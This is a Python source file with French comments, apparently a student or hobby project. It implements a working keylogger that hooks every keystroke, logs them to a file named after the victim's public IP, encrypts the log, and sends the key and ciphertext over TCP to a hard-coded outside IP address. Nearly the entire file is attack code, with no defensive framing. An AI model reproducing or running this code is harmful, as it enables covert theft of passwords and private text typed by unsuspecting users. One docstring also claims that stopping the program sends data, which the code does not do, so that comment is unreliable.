import socket
import time
import keyboard
from unidecode import unidecode
import requests
import datetime
import paramiko
from cryptography.fernet import Fernet

class Fichier:
    
    """
    Classe pour enregistrer les frappes du clavier et stocker les données dans un fichier.
    """

    def __init__(self):
        """
        Initialise les attributs nom_fichier et majuscule_active.

        Retourne :
            Aucune valeur de retour
        """
        self.majuscule_active = False
        self.nom_fichier = ""

    def get_ip(self):
        """
        Récupère l'adresse IP de l'utilisateur en utilisant une requête HTTP.

        Retourne:
            str: L'adresse IP de l'utilisateur si la requête réussit, sinon None.
        """
        try:
            response = requests.get('https://httpbin.org/ip')
            if response.status_code == 200:
                ip_address = response.json().get('origin')
                return ip_address
            else:
                return None
        except Exception as e:
            return None

    def get_keyboard(self, e):
        """
        Enregistre les touches du clavier dans un fichier unique basé sur l'adresse IP de l'utilisateur
        la date et l'heure.

        Arguments:
            e (keyboard.KeyboardEvent): L'événement du clavier déclenché.

        """
        if not self.nom_fichier:
            ip_personne = self.get_ip() or "unknown"
            self.nom_fichier = f"{ip_personne}-{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}-keyboard.txt"

        liste_mots = []
        if e.event_type == keyboard.KEY_DOWN:
            if e.name == "space":
                liste_mots.append(" ")
            elif e.name == "backspace" or e.name == "delete" or e.name == "suppr":
                if liste_mots:
                    liste_mots.pop()
            elif e.name == "enter":
                liste_mots.append("\n")
            elif e.name == "tab":
                liste_mots.append("\t")
            elif e.name == "esc":
                liste_mots.append("")
            elif e.name == "ctrl":
                liste_mots.append(" ctrl+")
            elif e.name == "haut":
                liste_mots.append("↑")
            elif e.name == "bas":
                liste_mots.append("↓")
            elif e.name == "droite":
                liste_mots.append("→")
            elif e.name == "gauche":
                liste_mots.append("←")
            elif e.name == "verr.maj" or e.name == "maj":
                liste_mots.append("")
            else:
                liste_mots.append(unidecode(e.name))

        with open(self.nom_fichier, "a", encoding='utf-8') as fichier:
            for mots in liste_mots:
                fichier.write(mots)

    def encrypt_and_send_file(self):
        """
        Chiffre le contenu du fichier avec une clé générée aléatoirement et envoie le fichier chiffré au serveur.

        Arguments:
            server_address (str): L'adresse IP du serveur.
            server_port (int): Le numéro de port du serveur.
        """
        server_address = "162.19.252.34"
        server_port = 12345
        key = Fernet.generate_key()
        cipher_suite = Fernet(key)

        with open(self.nom_fichier, 'rb') as file:
            plaintext = file.read()

        encrypted_text = cipher_suite.encrypt(plaintext)

        self.send_encrypted_file(key, encrypted_text, server_address, server_port)

    def send_encrypted_file(self, key, encrypted_text, server_address, server_port):
        """
        Envoie le fichier chiffré au serveur.

        Arguments:
            key (bytes): La clé de chiffrement.
            encrypted_text (bytes): Le texte chiffré.
            server_address (str): L'adresse IP du serveur.
            server_port (int): Le numéro de port du serveur.
        """
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
                client_socket.connect((server_address, server_port))
                client_socket.sendall(key)
                client_socket.sendall(encrypted_text)

            print("File encrypted and sent successfully.")
        except Exception as e:
            print(f"Error while sending encrypted file: {e}")


    def start_keyboard(self):
        """
        Démarre la surveillance du clavier.
        Pour arrêter le programme tapez : 'Ctrl+Alt+G' comme raccourci.
        Une limite de temps est défini à 10 minutes (600 secondes) pour 
        arrêter le programme automatiquement. 

        Retourne: 
            Aucune valeur de retour, la fonction s'exécute jusqu'à ce que la limite de temps
        soit atteinte ou qu'une exception KeyboardInterrupt soit levée.
        """
        
        custom_combination = 'ctrl+alt+g'
        keyboard.hook(self.get_keyboard)
        keyboard.add_hotkey(custom_combination, self.stop_program)
        time_limit = 10 * 60
        start_time = time.time()

        try:
            while time.time() - start_time < time_limit:
                time.sleep(1)
        except KeyboardInterrupt:
            pass  

    def stop_program(self):
        """
        Arrête le programme en appelant  pour envoyer des données au serveur
        avant de quitter le programme.

        Retourne: 
            Aucune valeur de retour, la fonction termine le programme après l'envoi des données.
        """
        exit()

if __name__ == "__main__":
    fichier = Fichier()
    fichier.start_keyboard()
    fichier.encrypt_and_send_file()
